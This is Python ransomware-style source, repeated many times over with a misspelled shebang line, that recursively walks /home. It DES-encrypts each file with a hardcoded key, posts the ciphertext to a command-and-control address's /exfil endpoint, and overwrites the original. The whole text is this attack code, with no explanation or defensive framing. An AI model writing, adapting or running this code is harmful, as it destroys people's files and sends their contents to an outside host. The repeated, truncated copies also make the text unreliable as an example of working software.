DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
